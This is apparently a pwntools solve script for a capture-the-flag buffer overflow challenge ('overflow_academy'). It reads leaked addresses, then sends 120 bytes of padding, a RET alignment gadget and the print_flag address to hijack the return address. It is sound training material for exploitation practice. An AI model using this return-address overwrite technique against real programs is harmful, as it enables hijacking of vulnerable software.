#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

# Configuration
if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    HOST = 'overflow.challenges2.ctf.dscjssstuniv.in'
    PORT = 9001
    io = remote(HOST, PORT)
else:
    io = process('./overflow_academy')

# Receive banner
banner = io.recvuntil(b'Buffer address: ')
print(banner.decode(errors='ignore'))

buffer_addr = int(io.recvline().strip(), 16)

io.recvuntil(b'Secret function address: ')
win_addr = int(io.recvline().strip(), 16)

log.info(f"Buffer address: {hex(buffer_addr)}")
log.info(f"print_flag() address: {hex(win_addr)}")

# Build payload:
# - Padding to reach return address (120 bytes due to stack alignment)
# - RET gadget for stack alignment (x86_64 requires 16-byte alignment)
# - Return address pointing to print_flag()

ret_gadget = 0x401016  # Simple RET instruction for alignment
offset = 120  # Correct offset to reach return address
payload = b'A' * offset
payload += p64(ret_gadget)  # Align stack
payload += p64(win_addr)    # Call print_flag()

log.info(f"Payload size: {len(payload)} bytes")
log.info(f"Overwriting return address with print_flag()...")

io.sendline(payload)

# Receive output - the flag comes before the segfault
print("\n" + "="*50)
try:
    # Give it time to execute print_flag()
    io.recvuntil(b'Returning now...')
    response = io.recv(timeout=1)
    print(response.decode(errors='ignore'))
except:
    pass

# Try to get any remaining output
try:
    response = io.recvall(timeout=1)
    print(response.decode(errors='ignore'))
except:
    pass
print("="*50)
